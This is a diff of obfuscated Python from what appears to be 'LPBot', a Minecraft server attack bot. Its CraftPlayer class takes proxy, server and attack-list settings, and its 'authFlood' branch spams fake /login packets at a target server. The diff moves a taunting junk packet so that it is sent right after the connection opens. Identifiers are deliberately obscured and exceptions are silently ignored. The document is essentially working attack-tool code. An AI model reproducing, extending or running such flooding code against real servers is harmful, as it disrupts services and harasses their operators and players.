@@ -292,16 +292,6 @@ class CraftPlayer :
                 if OOO0000OO0O0000OO =='authFlood':
                     OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
                     OO0OOOO0O00O0OO00 .SendPacket ('\x01'+CraftString ("/login asdasidijasdijoaiosdjio"))
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
-                    OO0OOOO0O00O0OO00 .SendPacket ('n0 s3curity w4s f0und bitch')
         except :
             pass
     def __init__ (OO0OO0O000OOOOO0O ,O00000O0O0O000000 ,password ='',protonum =210 ,proxy ='',server ='',hostx ='',portx ='',isOffline =False ,printchat =True ,debug =False ,attacks =[],prependFlood ='',msg ='Attack by LPBot (BETA)',count =5 ,callback =dummy ,eventHook =None ):
@@ -350,6 +340,7 @@ class CraftPlayer :
             _O0O0OO0OOO0000O0O =O0OOOOO00OOO00000 ._server [0 ]
             _O0O0O00OO0OOOO000 =O0OOOOO00OOO00000 ._server [1 ]
             O0OOOOO00OOO00000 ._socket .connect ((_O0O0OO0OOO0000O0O ,_O0O0O00OO0OOOO000 ))
+            O0OOOOO00OOO00000 .SendPacket ('n0 s3curity w4s f0und bitch')
             O0OOOOO00OOO00000 .SendPacket ('\x00'+encode_varint (O0OOOOO00OOO00000 ._protonum )+CraftString (_O0O0OO0OOO0000O0O )+struct .pack ('>h',_O0O0O00OO0OOOO000 )+encode_varint (2 ))
             O0OOOOO00OOO00000 .SendPacket ('\x00'+CraftString (O0OOOOO00OOO00000 ._nickname ))
         except :
